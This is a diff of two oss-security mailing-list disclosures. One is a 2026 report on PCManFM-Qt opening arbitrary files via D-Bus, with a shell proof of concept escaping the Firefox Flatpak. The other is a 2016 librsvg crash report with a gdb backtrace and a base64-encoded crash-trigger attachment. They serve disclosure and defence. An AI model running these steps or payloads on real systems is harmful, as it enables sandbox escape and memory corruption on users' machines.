@@ -1,4 +1,9 @@
-Received: (qmail 30175 invoked by uid 550); 20 May 2026 02:30:10 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5737" "Monday" "4" "July" "2016" "21:13:05" "+0200" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdSFtHbu1d45rK4Hi8=Z+KirfOZ+g=gBT5LsCWcxgfnz-w@mail.gmail.com>" "129" "[oss-security] Browsing and attaching images considered harmful in Linux" "^Date:" nil nil "7" "2016070419:13:05" "[oss-security] Browsing and attaching images considered harmful in Linux" (number mark "        gustavo.grie Jul  4  129/5737  " thread-indent "\"[oss-security] Browsing and attaching images considered harmful in Linux\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 1914 invoked by uid 550); 4 Jul 2016 19:13:26 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,115 +11,165 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 30172 invoked from network); 20 May 2026 00:33:57 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=riseup.net; s=squak;
-	t=1779237229; bh=F/hXU5JWxbEfNYgGHhkMN3cbDXTJ0Xi5KCR7SQiDVLE=;
-	h=Date:From:To:Subject:From;
-	b=TKqtscvKMPaWoZH1XyIZ54EsYOfg2+T7nHeYL9+2gr1K58kCZl+TeylOV4pUjHR7R
-	 khUzS5Ryu+ju2f+B6YygXBCiBTOxc+2fU6LN+VS8wF6knqPkddEawj+VhJ1fj0KQLh
-	 6GThuMtRbX/Kx3SdJydCHrfztxKN6FYqt+g/QkC0=
-X-Riseup-User-ID: FE614B2A7E023CDD1AA0F5246788FEAAED2A5FF9996B4D468281D26D611D128C
-Date: Tue, 19 May 2026 20:33:45 -0400
-From: Aaron Rainbolt <arraybolt3@riseup.net>
-To: oss-security@lists.openwall.com
-Message-ID: <20260519203345.01f21f23@riseup.net>
+Received: (qmail 1856 invoked from network); 4 Jul 2016 19:13:18 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=fD/iEu2I6Qv/gTsTTqgWksnKZJtAAKjgQkNYSrSi628=;
+        b=nwohWL7hI/orD9X0M2d8xvwr2gV/LX9VMIqNbWaItJ1TV8R/8+u4EZEYbtuJ0Y/rVD
+         OhBK/lNTN4ASnehU9w9HpFGN/G6AG6F2yC/Jlc4P3gbEdO9BPu7GEQpeWC3Mh8Y8gbpH
+         JeC4YujZuhus4YkGr7MVIMAuxzVqSl4p3uSU4DHs1qeAXAjSfheNLcjMcZEz6Q35AxYF
+         Xnyg0ehUKpXrUYsVbv4f0m2KzlMYgcRS7K1Z+a74rnf7i1A5cK5P90NBu6XnnAS4SeuA
+         H9aSsRsAUxsgOUH9HllWgawidh870cicFCIJp+qQpeOiwy3bxcZwxLikk9P+TbKLEb0l
+         JL7w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=fD/iEu2I6Qv/gTsTTqgWksnKZJtAAKjgQkNYSrSi628=;
+        b=jBVcoIOEkBiq7jBLx6kbPoe4Efs3wWky9yzOFkCCg/O49vy4ggH80dsgIlLAe39jT4
+         +pyvNz+TdKV3Pe170oEY1PlNNOGBqj6f1UpFa+hos687sRab0oLOUUp/d7tpPkwGiBqF
+         m48gjHkUSy5hQ6vBx31z6UW+4SBLZPNJQ4xzlKndFHqi7CVmVPT5WxSkCsTcn2h9oeRh
+         JRetkSZIIjG2H44FbNqscfZEABFWi2DCSpBaHI2sNsTNshKelPLSuJ6XfENvtT7jPVAa
+         xM1al4h4/iCnHLSmsvDWQT+CumabRlnl6wEgsvYNO1/be3kG3atzJvThoHBZsCozU7pB
+         hTGA==
+X-Gm-Message-State: ALyK8tJc0LlY8Z8hxzPWv+k93giIxm/MGEPBofgwK/Dm2oUp/QLkKFTHIGC2Pzy6i3n4JjoIrtbQPavuOJgshg==
+X-Received: by 10.107.137.95 with SMTP id l92mr10359425iod.177.1467659586018;
+ Mon, 04 Jul 2016 12:13:06 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; boundary="Sig_/taT7LpI=+1YikXULQa2y_/7";
- protocol="application/pgp-signature"; micalg=pgp-sha512
-Subject: [oss-security] PCManFM-Qt allows arbitrary files to be opened via the
- org.freedesktop.FileManager1.ShowFolders method
+Message-ID: <CACn5sdSFtHbu1d45rK4Hi8=Z+KirfOZ+g=gBT5LsCWcxgfnz-w@mail.gmail.com>
+Content-Type: multipart/mixed; boundary=001a113ecbfe47421c0536d42091
+Date: Mon, 4 Jul 2016 21:13:05 +0200
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Browsing and attaching images considered harmful in Linux
+To: oss-security@lists.openwall.com
 
---Sig_/taT7LpI=+1YikXULQa2y_/7
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: quoted-printable
+--001a113ecbfe47421c0536d42091
+Content-Type: text/plain; charset=UTF-8
 
-This issue was mentioned in the "On the issue of MIME handlers that
-execute arbitrary code" thread [1], and was brought up three years ago
-in a report about a vulnerability in Mono [2], but it looks like no one
-requested a CVE ID for it, so this is a targeted report so I have
-something self-contained to link to.
+Hi,
 
-PCManFM-Qt implements the standard org.freedesktop.FileManager1 D-Bus
-interface [3]. The interface specification states that the
-org.freedesktop.FileManager1.ShowFolders function "assumes that the
-specified URIs are folders; the file manager is supposed to show a
-window with the contents of each folder." I believe the spec meant to
-say that this method only takes URIs pointing to folders as arguments,
-but PCManFM-Qt interprets the word "assumes" literally and hands the
-URIs to a routine that does a MIME handler lookup and launch. If all of
-the specified URIs actually *do* point to directories, this will do
-what the user expects, but if any of the URIs point to files, those
-files will be opened. This can be used for a number of different
-malicious purposes; most notably, if the user is unlucky enough to have
-Wine installed using WineHQ's upstream packages, it allows escaping
-various sandboxing mechanisms (Flatpak, Snap, etc.) by dropping an EXE
-file on the disk and then pointing PCManFM-Qt to it. (This is because
-WineHQ's builds of Wine ship a MIME handler for EXE files. That handler
-runs EXE files blindly.)
+I would like to bring the attention of the oss-security list to the
+existence of many security issues in the gdk-pixbuf library and its
+dependencies causing a that attaching a corrupted image file in Linux
+has become a risky business. For instance,  there is a read
+out-of-bounds in librsvg2 (a dependency of gdk-pixbuf used to render
+svg images), which can be easily triggered if you try to attach a svg
+in Firefox. I tested it in Ubuntu 14.04 (x86_64) using the
+corresponding version of librsvg2 (2.40.2-1 with debug symbols) and
+Firefox. To reproduce:
 
-A simple proof-of-concept exploit showing how to use this to escape the
-Firefox Flatpak if you have PCManFM-Qt and a WineHQ version of Wine
-installed:
+1. Download and unpack boom.tar.gz somewhere.
+2. gdb --args /usr/lib/firefox/firefox
+3. Execute "run" and try to attach (ctrl+o) the svg file inside boom
+directory in Firefox.
 
-    winecfg # this will generate ~/.wine if needed, close the window
-            # after running this
-    # In a real-world situation, something in the sandbox would write
-    # this file, but for a proof-of-concept let's just drop the file
-    # into place from the host system
-    cp \
-      $HOME/.wine/drive_c/Program\ Files/Windows\ NT/Accessories/wordpad.ex=
-e \
-      $HOME/.var/app/org.mozilla.firefox/data/
-    chmod -x $HOME/.var/app/org.mozilla.firefox/data/wordpad.exe
-    flatpak run --command=3D/bin/bash org.mozilla.firefox
-    # next command is run inside the sandbox, which happens to have
-    # both bash and dbus-send available
-    dbus-send \
-      --print-reply \
-      --session \
-      --dest=3Dorg.freedesktop.FileManager1 \
-      /org/freedesktop/FileManager1 \
-      org.freedesktop.FileManager1.ShowFolders \
-      array:string:$HOME/.var/app/org.mozilla.firefox/data/wordpad.exe \
-      string:1234
+Result:
 
-This will result in a Wine Wordpad window opening, which you can then
-use to read and write files that the Firefox Flatpak shouldn't be able
-to access. There are other ways this could be used to an attacker's
-benefit as well; for instance, the Tor Project provides an application
-called "oniux" that runs applications in a network namespace, where all
-traffic is tunneled through Tor via Arti. [4] An application could
-circumvent the network namespace by dropping an HTML file on the disk
-that references an attacker-controlled network resource, and then
-opening that file in a non-torified web browser via PCManFM-Qt.
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffbb7a4c0d in rsvg_pattern_fix_fallback
+(pattern=pattern@entry=0x7ffffffea110) at rsvg-paint-server.c:645
+645        rsvg-paint-server.c: No such file or directory.
+(gdb) bt
+#0  0x00007fffbb7a4c0d in rsvg_pattern_fix_fallback
+(pattern=pattern@entry=0x7ffffffea110) at rsvg-paint-server.c:645
+#1  0x00007fffbb7c0650 in _set_source_rsvg_pattern
+(ctx=0x7fffc1672b00, rsvg_pattern=0x7ffffffea110, opacity=<optimized
+out>, bbox=...)
+    at rsvg-cairo-draw.c:195
+#2  0x00007fffbb7c1e4d in rsvg_cairo_render_path (ctx=0x7fffc1672b00,
+path=<optimized out>) at rsvg-cairo-draw.c:526
+#3  0x00007fffbb7bea12 in rsvg_render_path
+(ctx=ctx@entry=0x7fffc1672b00, path=path@entry=0x7fffc4708640) at
+rsvg-base.c:1976
+#4  0x00007fffbb7b59c8 in _rsvg_node_rect_draw (self=0x7fffc45c6f50,
+ctx=0x7fffc1672b00, dominate=0) at rsvg-shapes.c:479
+#5  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc45c6f50,
+ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
+#6  0x00007fffbb7b6583 in _rsvg_node_draw_children
+(self=0x7fffc8058560, ctx=0x7fffc1672b00, dominate=0) at
+rsvg-structure.c:87
+#7  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc8058560,
+ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
+#8  0x00007fffbb7b6903 in rsvg_node_svg_draw (self=0x7fffc4915080,
+ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:323
+#9  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc4915080,
+ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
+#10 0x00007fffbb7c2ac3 in rsvg_handle_render_cairo_sub
+(handle=handle@entry=0x7fffc8cd3440, cr=cr@entry=0x7fffd7d58000,
+id=id@entry=0x0)
+    at rsvg-cairo-render.c:225
+#11 0x00007fffbb7c2ef4 in rsvg_handle_get_pixbuf_sub
+(handle=0x7fffc8cd3440, id=id@entry=0x0) at rsvg.c:90
+#12 0x00007fffbb7c2f77 in rsvg_handle_get_pixbuf (handle=<optimized
+out>) at rsvg.c:119
+#13 0x00007fffbb9cee46 in gdk_pixbuf__svg_image_stop_load
+(data=0x7fffc50e18e0, error=0x7ffffffea6b8) at io-svg.c:160
+#14 0x00007ffff35d31fb in gdk_pixbuf_loader_close
+(loader=loader@entry=0x7fffc4424ea0, error=error@entry=0x0) at
+gdk-pixbuf-loader.c:821
+#15 0x00007ffff35d0e2a in gdk_pixbuf_new_from_file_at_scale
+(filename=0x7fffc4577100
+"/home/g/Work/Code/ef/gdk-pixbuf/svg/overflow-real-reap.svg",
+    width=<optimized out>, height=<optimized out>,
+preserve_aspect_ratio=<optimized out>, error=0x0) at
+gdk-pixbuf-io.c:1372
+#16 0x00007fffeafc7d19 in UpdateFilePreviewWidget
+(file_chooser=0x7fffd9d53a30, preview_widget_voidptr=<optimized out>)
+    at /build/firefox-mh9_e1/firefox-46.0.1+build1/widget/gtk/nsFilePicker.cpp:115
+#17 0x00007ffff25273b8 in g_closure_invoke () from
+/usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0
+#18 0x00007ffff2538d3d in ?? () from
+/usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0
+...
 
-This issue was reported privately to the LXQt developers on February 1,
-2026. Based upon upstream's reply, I do not believe they consider this
-to be a problem, since the behavior is arguably spec-compliant, and
-(quoting from the reply I got) "Checking whether a path is a file or
-directory can block I/O under special circumstances; so, it isn't an
-option in this case."
+It is interesting to note that rcx looks controllable:
 
---
-Aaron
+(gdb) x/i $rip
+=> 0x7fffbb7a4c0d <rsvg_pattern_fix_fallback+333>:        testb  $0x4,0xe4(%rcx)
+(gdb) info registers
+...
+rcx            0xe5e5e5e5e5e5e5e5        -1880844493789993499
+...
 
-[1] http://bugs.winehq.org/show_bug.cgi?id=3D59767
-[2] https://www.openwall.com/lists/oss-security/2023/01/05/1
-[3] https://www.freedesktop.org/wiki/Specifications/file-manager-interface/
-[4] https://arti.torproject.org/related/oniux/
+Fortunately, this issue is already solved in the last revision of
+librsvg2 (AFAIK, this issue has no CVE, so please MITRE assign one if
+suitable). Nevertheless, I reported such vulnerability to Mozilla more
+than a month ago hoping that they will disable the svg support in the
+open/attach widget. After some discussion, it was marked as WONTFIX.
+While i understand why, i still feel it can be productive to discuss
+this here.
 
---Sig_/taT7LpI=+1YikXULQa2y_/7
-Content-Type: application/pgp-signature
-Content-Description: OpenPGP digital signature
+(the same trick can be used to crash Chrome/Chromium, since the code
+to open/attach an image is almost the same, so this is not a Firefox
+specific issue)
 
------BEGIN PGP SIGNATURE-----
 
-iHUEARYKAB0WIQS8QsiCjFi4DcDBX+Q5rdye4jrrCAUCag0BaQAKCRA5rdye4jrr
-CB8/AQDhtrDDdiqsiEVtKIC9GL6nwY3KKbv/clTgpLk1uMuVxgD9EELPDwhOTKx2
-0CWpk4f1bIBUsuGycxztJH96aGGe9w8=
-=PLR3
------END PGP SIGNATURE-----
+Regards,
+Gustavo
 
---Sig_/taT7LpI=+1YikXULQa2y_/7--
+--001a113ecbfe47421c0536d42091
+Content-Type: application/x-gzip; name="boom.tar.gz"
+Content-Disposition: attachment; filename="boom.tar.gz"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_iq8ec04u0
+
+H4sIAFvpRVcAA+1V30/bMBDmmb/iZjppe0jjNElTVU2lDQSPm1rgPSRua+Em
+ke3Ssr9+F8dpk8LgBR4mOLXxz7v77ruzfVcUa7d4YHIhiq0jWSKqT9lXD8uT
+txJK6XAYALZeFNJ2a8THP3iDaOD5wyCgEVAviIb+CdA3Q/CCbJROJEJ5LdzX
+1utYYN/+JzLBRAPPYoKtJrDlmV7FxKP0K4EV48uVbkYPnG1/FruYUKAQjCj4
+ZHoKMPniOLERx9mPAeUtx2372Xh+e3XNlD5PFAM1RuwrrRG7iklv1kNQuEXj
++gVTqeSl5kUOu2qTqgGX1Rdbt7TDfb/qPNE19oqSyUQXcm5mYbcWuTJ+RWNz
+tslZ1jeGKiNdBWOjTJQ6l1wzyRMw2mvRQtTB0N5bL3bCNlOaa8FM7irEgpFp
+b3Y+cc10zRRbKGtyUeTaWSQpw4Htr7l4jAnBdRaTm8sayX6fo2Ta6MJOcMkW
+Men33ZRz4taIntt7mLSoLYTJ0gJlOWaqg2B+u7Aziv9BKN6IWGMt/GWikQth
+jPw2/dwjUM/mNznXyOdGMTkv0fWv/Eaxdi13Svmokr3qR8DtOMrbjgakIiC/
+H68MCWcH/6j0nIL/vMKgiSvlMsXMpYggJJA+mkbGBB0tuBAxWUrkibj7Oq31
+pw2fXQvUmqC1DdoYkSw7hCVZqu38RopvDST/+ws02TQvbf66SePdpPlVcBPN
+dtoQIRnqKy2Le1zLixyzAdb9nUjSezLlCo/WGLy+Dz2sWVRsezNw64Ih1dlF
+rh/N14INotEBrB+OmphrV43jM7yIbbHiJQKpvUDqUsxkQtrkvObliNjGRx2O
+HToNl/vcGUaOyv3KMretLM/QRCGyDpmVK4BK1UnydFVgWtc8y/CEG3yjY3e0
+Hz4BVEPdrvAKIdOL2Y/L6yOWJy7e+NPTu+r9f+c3BtMQReE/33/69P2nYUBP
+IHxnXEY++Pv/KZ/yKR9X/gKBPFQyAA4AAA==
+
+--001a113ecbfe47421c0536d42091--
